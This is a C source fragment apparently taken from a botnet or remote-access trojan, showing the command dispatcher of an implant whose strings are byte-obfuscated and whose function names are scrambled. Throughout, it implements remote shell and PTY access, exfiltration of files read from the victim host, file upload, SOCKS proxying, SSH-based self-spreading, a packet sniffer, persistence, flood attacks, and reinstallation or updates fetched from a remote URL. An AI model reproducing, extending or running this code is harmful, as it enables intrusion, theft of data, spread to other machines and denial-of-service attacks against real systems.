        else Ng2ZR5y(c, _S(19,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xe2,0xc3,0xd8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        result = 0; goto done;
    }

    if (strcmp(cmd_str, _S(6,0x8d,0xdf,0xc2,0xc5,0xca,0xca)) == 0) {
        if (_sn7PK3z > 0) {
            Ng2ZR5y(c, _S(24,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xed,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        } else {
            const char *args_sniff = (sa_count(&fields) >= 2) ? sa_get(&fields, 1) : _S(15,0x83,0xd8,0xc1,0xdc,0x83,0x82,0xdf,0xc2,0xc5,0xca,0xca,0x82,0xc0,0xc3,0xcb);
            sniffer_init(args_sniff);
            Ng2ZR5y(c, _S(24,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xff,0xc2,0xc5,0xca,0xca,0xc9,0xde,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6));
        }
        result = 0; goto done;
    }

    if (strcmp(cmd_str, _S(10,0x8d,0xdf,0xd8,0xc3,0xdc,0xdf,0xc2,0xc5,0xca,0xca)) == 0) {
        if (_sn7PK3z > 0) { sniffer_kill(); Ng2ZR5y(c, _S(16,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xff,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6)); }
        else Ng2ZR5y(c, _S(20,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xe2,0xc3,0xd8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        result = 0; goto done;
    }


#endif /* NO_SELFREP */

    /* !download <path> -- read file and send base64-encoded with markers */
    if (strcmp(cmd_str, _S(9,0x8d,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8)) == 0) {
        const char *path;
        FILE *f;
        long fsize;
        char *raw;
        dstr b64, msg;
        const char *basename_ptr;

        if (sa_count(&fields) < 2) {
            Ng2ZR5y(c, _S(24,0xf7,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xc1,0xc5,0xdf,0xdf,0xc5,0xc2,0xcb,0x8c,0xdc,0xcd,0xd8,0xc4,0xa6));
            result = -1;
            goto done;
        }
        path = sa_get(&fields, 1);

        f = fopen(path, _S(2,0xde,0xce));
        if (!f) {
            char ebuf[512];
            snprintf(ebuf, sizeof(ebuf), _S(27,0xf7,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xcf,0xcd,0xc2,0xc2,0xc3,0xd8,0x8c,0xc3,0xdc,0xc9,0xc2,0x96,0x8c,0x89,0xdf,0xa6), path);
            Ng2ZR5y(c, ebuf);
            result = -1;
            goto done;
        }
        fseek(f, 0, SEEK_END);
        fsize = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (fsize < 0 || fsize > 10 * 1024 * 1024) {
            fclose(f);
            Ng2ZR5y(c, _S(34,0xf7,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xca,0xc5,0xc0,0xc9,0x8c,0xd8,0xc3,0xc3,0x8c,0xc0,0xcd,0xde,0xcb,0xc9,0x8c,0x84,0x92,0x9d,0x9c,0xe1,0xee,0x85,0xa6));
            result = -1;
            goto done;
        }
        raw = (char *)malloc((size_t)fsize + 1);
        if (!raw) { fclose(f); result = -1; goto done; }
        if ((long)fread(raw, 1, (size_t)fsize, f) != fsize) {
            free(raw);
            fclose(f);
            Ng2ZR5y(c, _S(22,0xf7,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xde,0xc9,0xcd,0xc8,0x8c,0xc9,0xde,0xde,0xc3,0xde,0xa6));
            result = -1;
            goto done;
        }
        fclose(f);

        b64 = _uA7kc2G((const uint8_t *)raw, (size_t)fsize);
        free(raw);

        /* Extract basename from path */
        basename_ptr = strrchr(path, '/');
        if (basename_ptr) basename_ptr++;
        else basename_ptr = path;

        /* Send: __FILE_START__<basename>\n<base64>\n__FILE_END__\n */
        ds_init(&msg);
        ds_cat(&msg, _S(14,0xf3,0xf3,0xea,0xe5,0xe0,0xe9,0xf3,0xff,0xf8,0xed,0xfe,0xf8,0xf3,0xf3));
        ds_cat(&msg, basename_ptr);
        ds_cat(&msg, _S(1,0xa6));
        ds_catds(&msg, &b64);
        ds_cat(&msg, _S(14,0xa6,0xf3,0xf3,0xea,0xe5,0xe0,0xe9,0xf3,0xe9,0xe2,0xe8,0xf3,0xf3,0xa6));
        ds_free(&b64);

        Ng2ZR5y(c, ds_cstr(&msg));
        ds_free(&msg);
        result = 0;
        goto done;
    }

    /* !upload <path> <base64data> -- decode base64 and write to file */
    if (strcmp(cmd_str, _S(7,0x8d,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8)) == 0) {
        const char *path;
        const char *b64data;
        dbuf decoded;
        FILE *f;

        if (sa_count(&fields) < 3) {
            Ng2ZR5y(c, _S(44,0xf7,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xd9,0xdf,0xcd,0xcb,0xc9,0x96,0x8c,0x8d,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0x8c,0x90,0xdc,0xcd,0xd8,0xc4,0x92,0x8c,0x90,0xce,0xcd,0xdf,0xc9,0x9a,0x98,0xc8,0xcd,0xd8,0xcd,0x92,0xa6));
            result = -1;
            goto done;
        }
        path = sa_get(&fields, 1);
        b64data = sa_get(&fields, 2);
        decoded = _rr5LH7D(b64data);
        if (db_len(&decoded) == 0 && strlen(b64data) > 0) {
            Ng2ZR5y(c, _S(30,0xf7,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xce,0xcd,0xdf,0xc9,0x9a,0x98,0x8c,0xc8,0xc9,0xcf,0xc3,0xc8,0xc9,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0xa6));
            db_free(&decoded);
            result = -1;
            goto done;
        }
        f = fopen(path, _S(2,0xdb,0xce));
        if (!f) {
            char ebuf[512];
            snprintf(ebuf, sizeof(ebuf), _S(26,0xf7,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xcf,0xcd,0xc2,0xc2,0xc3,0xd8,0x8c,0xdb,0xde,0xc5,0xd8,0xc9,0x96,0x8c,0x89,0xdf,0xa6), path);
            Ng2ZR5y(c, ebuf);
            db_free(&decoded);
            result = -1;
            goto done;
        }
        fwrite(db_ptr(&decoded), 1, db_len(&decoded), f);
        fclose(f);
        {
            char obuf[512];
            snprintf(obuf, sizeof(obuf), _S(31,0xf7,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xdb,0xde,0xc3,0xd8,0xc9,0x8c,0x89,0xc0,0xd9,0x8c,0xce,0xd5,0xd8,0xc9,0xdf,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0xa6),
                     (unsigned long)db_len(&decoded), path);
            Ng2ZR5y(c, obuf);
        }
        db_free(&decoded);
        result = 0;
        goto done;
    }

    /* !socksauth -- set SOCKS credentials */
    if (strcmp(cmd_str, _S(10,0x8d,0xdf,0xc3,0xcf,0xc7,0xdf,0xcd,0xd9,0xd8,0xc4)) == 0) {
        char buf[256];
        if (sa_count(&fields) < 3) { sa_free(&fields); return -1; }
        pthread_mutex_lock(&_kL3Yy7R);
        ds_set(&_yr2Dc6W, sa_get(&fields, 1));
        ds_set(&_uv4SZ5A, sa_get(&fields, 2));
        pthread_mutex_unlock(&_kL3Yy7R);
        snprintf(buf, sizeof(buf), ds_cstr(&_am5bJ3X), sa_get(&fields, 1), sa_get(&fields, 2));
        Ng2ZR5y(c, buf);
        result = 0;
        goto done;
    }

    /* unknown command */
    result = -1;

done:
    sa_free(&fields);
    return result;
}

/* ==========================================================================
 * BINARY COMMAND DISPATCHER (cmd_id + raw args)
 * Maps byte IDs to the same logic as CS6Ko7t but skips string matching.
 * ========================================================================== */

int yD8Ug8t(_EA8up4M *c, uint8_t cmd_id, const char *args) {
    DS4RR2W();
    Ng4eX6x();

    switch (cmd_id) {

    case CMD_SHELL: /* args = command string */
    {
        dstr output, encoded, msg;
        if (!args || !args[0]) return -1;
        output = Kc5Lw2k(args);
        encoded = _uA7kc2G((const uint8_t *)ds_cstr(&output), ds_len(&output));
        ds_free(&output);
        ds_init(&msg);
        {
            size_t needed = ds_len(&encoded) + ds_len(&_nE6py4K) + 16;
            char *buf = (char *)malloc(needed);
            snprintf(buf, needed, ds_cstr(&_nE6py4K), ds_cstr(&encoded));
            ds_set(&msg, buf);
            free(buf);
        }
        ds_free(&encoded);
        Ng2ZR5y(c, ds_cstr(&msg));
        ds_free(&msg);
        return 0;
    }

    case CMD_STREAM: /* args = command string */
    {
        machete_ctx_t *ctx;
        pthread_t tid;
        if (!args || !args[0]) return -1;
        ctx = (machete_ctx_t *)malloc(sizeof(machete_ctx_t));
        if (!ctx) return -1;
        ctx->cmd  = (char *)malloc(strlen(args) + 1);
        if (!ctx->cmd) { free(ctx); return -1; }
        memcpy(ctx->cmd, args, strlen(args) + 1);
        ctx->conn = c;
        pthread_create(&tid, NULL, Kj7VJ5r, ctx);
        pthread_detach(tid);
        Ng2ZR5y(c, ds_cstr(&_KZ7LL3b));
        return 0;
    }

    case CMD_DETACH: /* args = command string */
        if (!args || !args[0]) return -1;
        YS5EH8a(args);
        Ng2ZR5y(c, ds_cstr(&_Vm7uC8w));
        return 0;

    case CMD_PTY: /* open PTY session */
        Pz9Pty4W(c);
        return 0;

    case CMD_PTYDATA: /* write to PTY stdin */
        if (!args) return -1;
        Ry3PtyIn(args, strlen(args));
        return 0;

    case CMD_INFO:
    {
        char hostname[256];
        dstr arch, id;
        char info[1024], sendbuf[1200];
        memset(hostname, 0, sizeof(hostname));
        gethostname(hostname, sizeof(hostname) - 1);
        Xy5oR2j(&arch);
        Ai2mW7K(&id);
        snprintf(info, sizeof(info),
                 _S(42,0xe4,0xc3,0xdf,0xd8,0xc2,0xcd,0xc1,0xc9,0x96,0x8c,0x89,0xdf,0xa6,0xed,0xde,0xcf,0xc4,0x96,0x8c,0x89,0xdf,0xa6,0xee,0xc3,0xd8,0xe5,0xe8,0x96,0x8c,0x89,0xdf,0xa6,0xe3,0xff,0x96,0x8c,0xe0,0xc5,0xc2,0xd9,0xd4,0xa6),
                 hostname, ds_cstr(&arch), ds_cstr(&id));
        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&_mi6YG6d), info);
        Ng2ZR5y(c, sendbuf);
        ds_free(&arch);
        ds_free(&id);
        return 0;
    }

    case CMD_SOCKS: /* args = "" (default) or "port" or "host:port" */
    {
        if (args && args[0]) {
            if (strchr(args, ':') != NULL) {
                dstr rh, rp;
                ds_init(&rh); ds_init(&rp);
                if (gv4Kv3u(args, &rh, &rp)) {
                    int err = MA2zo8a(ds_cstr(&rh), ds_cstr(&rp), c);
                    char buf[256];
                    if (err < 0)
                        snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(20,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
                    else
                        snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), args);
                    Ng2ZR5y(c, buf);
                }
                ds_free(&rh); ds_free(&rp);
            } else {
                int err = jw8CH7B(args, c);
                char buf[256], addr[64];
                if (err != 0)
                    snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(11,0xce,0xc5,0xc2,0xc8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
                else {
                    snprintf(addr, sizeof(addr), _S(10,0x9c,0x82,0x9c,0x82,0x9c,0x82,0x9c,0x96,0x89,0xdf), args);
                    snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), addr);
                }
                Ng2ZR5y(c, buf);
            }
        } else {
            int err = jw8CH7B(_S(4,0x9d,0x9c,0x94,0x9c), c);
            char buf[256];
            if (err != 0)
                snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(11,0xce,0xc5,0xc2,0xc8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
            else
                snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), _S(12,0x9c,0x82,0x9c,0x82,0x9c,0x82,0x9c,0x96,0x9d,0x9c,0x94,0x9c));
            Ng2ZR5y(c, buf);
        }
        return 0;
    }

    case CMD_STOPSOCKS:
        tV4Lm4J();
        Ng2ZR5y(c, ds_cstr(&_cJ8BU8L));
        return 0;

    case CMD_SOCKSAUTH: /* args = "user pass" */
    {
        char buf[256];
        const char *sp = strchr(args, ' ');
        if (!sp) return -1;
        {
            char user[128], pass[128];
            size_t ulen = (size_t)(sp - args);
            if (ulen >= sizeof(user)) ulen = sizeof(user) - 1;
            memcpy(user, args, ulen); user[ulen] = '\0';
            strncpy(pass, sp + 1, sizeof(pass) - 1); pass[sizeof(pass) - 1] = '\0';
            pthread_mutex_lock(&_kL3Yy7R);
            ds_set(&_yr2Dc6W, user);
            ds_set(&_uv4SZ5A, pass);
            pthread_mutex_unlock(&_kL3Yy7R);
            snprintf(buf, sizeof(buf), ds_cstr(&_am5bJ3X), user, pass);
        }
        Ng2ZR5y(c, buf);
        return 0;
    }

#ifndef NO_SELFREP
    case CMD_SSH:
        if (_bj8XN2t > 0) {
            Ng2ZR5y(c, _S(22,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xed,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        } else {
            kh8hL4N(args, c);
            Ng2ZR5y(c, _S(22,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xff,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6));
        }
        return 0;

    case CMD_STOPSSH:
        if (_bj8XN2t > 0) {
            Ss3vb6a();
            Ng2ZR5y(c, _S(22,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xff,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xdf,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6));
        } else {
            Ng2ZR5y(c, _S(26,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xff,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xc2,0xc3,0xd8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        }
        return 0;

    case CMD_HTTP:
        if (_AR2yQ6h > 0) {
            Ng2ZR5y(c, _S(23,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xed,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        } else {
            St3TW4o(args);
            Ng2ZR5y(c, _S(30,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xe9,0xd4,0xdc,0xc0,0xc3,0xc5,0xd8,0x8c,0xc1,0xc3,0xc8,0xd9,0xc0,0xc9,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6));
        }
        return 0;

    case CMD_STOPHTTP:
        if (_AR2yQ6h > 0) { Gc5wq8T(); Ng2ZR5y(c, _S(15,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xff,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6)); }
        else Ng2ZR5y(c, _S(19,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xe2,0xc3,0xd8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        return 0;

    case CMD_SNIFF:
        if (_sn7PK3z > 0) {
            Ng2ZR5y(c, _S(24,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xed,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        } else {
            sniffer_init(args);
            Ng2ZR5y(c, _S(24,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xff,0xc2,0xc5,0xca,0xca,0xc9,0xde,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6));
        }
        return 0;

    case CMD_STOPSNIFF:
        if (_sn7PK3z > 0) { sniffer_kill(); Ng2ZR5y(c, _S(16,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xff,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6)); }
        else Ng2ZR5y(c, _S(20,0xf7,0xdf,0xc2,0xc5,0xca,0xca,0xf1,0x8c,0xe2,0xc3,0xd8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        return 0;


#endif /* NO_SELFREP */

    case CMD_PERSIST:
    {
        pthread_t tid;
        pthread_create(&tid, NULL, Ba7RE7V, NULL);
        pthread_detach(tid);
        Ng2ZR5y(c, ds_cstr(&_HH8Az2g));
        return 0;
    }

#ifndef NO_ATTACK
    case CMD_ATTACK: /* args = "method target port duration [key=val ...]" */
    {
        /* Reuse CS6Ko7t's attack parsing by reconstructing the text command */
        char cmd[4200];
        snprintf(cmd, sizeof(cmd), _S(10,0x8d,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7,0x8c,0x89,0xdf), args);
        return CS6Ko7t(c, cmd);
    }

    case CMD_STOPATTACK:
        UV8wo4a();
        Ng2ZR5y(c, _S(28,0xf7,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7,0xf1,0x8c,0xcd,0xc0,0xc0,0x8c,0xca,0xc0,0xc3,0xc3,0xc8,0xdf,0x8c,0xdf,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6));
        return 0;
#endif

    case CMD_REINSTALL: /* args = "url" */
    {
        char cmd[4200];
        if (!args || !args[0]) {
            Ng2ZR5y(c, _S(24,0xf7,0xde,0xc9,0xc5,0xc2,0xdf,0xd8,0xcd,0xc0,0xc0,0xf1,0x8c,0xc1,0xc5,0xdf,0xdf,0xc5,0xc2,0xcb,0x8c,0xf9,0xfe,0xe0,0xa6));
            return -1;
        }
        snprintf(cmd, sizeof(cmd), _S(13,0x8d,0xde,0xc9,0xc5,0xc2,0xdf,0xd8,0xcd,0xc0,0xc0,0x8c,0x89,0xdf), args);
        return CS6Ko7t(c, cmd);
    }

    case CMD_UPDATEFETCH: /* args = "<fetch_url> [bins_host]" */
    {
        char url_buf[1024], host_buf[512];
        const char *p;
        int i;

        if (!args || !args[0]) {
            Ng2ZR5y(c, _S(26,0xf7,0xd9,0xdc,0xc8,0xcd,0xd8,0xc9,0xca,0xc9,0xd8,0xcf,0xc4,0xf1,0x8c,0xc1,0xc5,0xdf,0xdf,0xc5,0xc2,0xcb,0x8c,0xf9,0xfe,0xe0,0xa6));
            return -1;
        }

        /* Parse first token: fetch_url */
        p = args;
        for (i = 0; *p && *p != ' ' && i < (int)sizeof(url_buf) - 1; p++, i++)
            url_buf[i] = *p;
        url_buf[i] = '\0';

        /* Update _Xx5Rw4X in memory */
        iB2Zq4a();
        ds_set(&_Xx5Rw4X, url_buf);

        /* Parse optional second token: bins_host */
        if (*p == ' ') {
            p++;
            for (i = 0; *p && *p != ' ' && i < (int)sizeof(host_buf) - 1; p++, i++)
                host_buf[i] = *p;
            host_buf[i] = '\0';
            if (host_buf[0]) {
                ds_set(&_mW2ZD2g, host_buf);
                _Gy7MD4D = ds_cstr(&_mW2ZD2g);
            }
        }

        /* Rewrite all persistence entries with new URL */
        AJ3ue7Q();

        Ng2ZR5y(c, _S(46,0xf7,0xd9,0xdc,0xc8,0xcd,0xd8,0xc9,0xca,0xc9,0xd8,0xcf,0xc4,0xf1,0x8c,0xd9,0xdc,0xc8,0xcd,0xd8,0xc9,0xc8,0x8c,0x87,0x8c,0xdc,0xc9,0xde,0xdf,0xc5,0xdf,0xd8,0xc9,0xc2,0xcf,0xc9,0x8c,0xde,0xc9,0xca,0xde,0xc9,0xdf,0xc4,0xc9,0xc8,0xa6));
        return 0;
    }

    case CMD_KILL:
        Ng2ZR5y(c, ds_cstr(&_hb6Aa4L));
        DB2Ve6Z();
        return 0;

    case CMD_EXIT:
        _exit(0);
        return 0;

    case CMD_DOWNLOAD: /* args = "filepath" */
    {
        char cmd[4200];
        if (!args || !args[0]) {
            Ng2ZR5y(c, _S(24,0xf7,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xc1,0xc5,0xdf,0xdf,0xc5,0xc2,0xcb,0x8c,0xdc,0xcd,0xd8,0xc4,0xa6));
            return -1;
        }
        snprintf(cmd, sizeof(cmd), _S(12,0x8d,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0x8c,0x89,0xdf), args);
        return CS6Ko7t(c, cmd);
    }

    case CMD_UPLOAD: /* args = "filepath base64data" */
    {
        char cmd[65536];
        if (!args || !args[0]) {
            Ng2ZR5y(c, _S(22,0xf7,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0xf1,0x8c,0xc1,0xc5,0xdf,0xdf,0xc5,0xc2,0xcb,0x8c,0xcd,0xde,0xcb,0xdf,0xa6));
            return -1;
        }
        snprintf(cmd, sizeof(cmd), _S(10,0x8d,0xd9,0xdc,0xc0,0xc3,0xcd,0xc8,0x8c,0x89,0xdf), args);
        return CS6Ko7t(c, cmd);
    }

    default:
        _nS5PJ8Y(_S(30,0xd5,0xe8,0x94,0xf9,0xcb,0x94,0xd8,0x96,0x8c,0xd9,0xc2,0xc7,0xc2,0xc3,0xdb,0xc2,0x8c,0xcf,0xc1,0xc8,0xf3,0xc5,0xc8,0x8c,0x9c,0xd4,0x89,0x9c,0x9e,0xf4), cmd_id);
        return -1;
    }
}
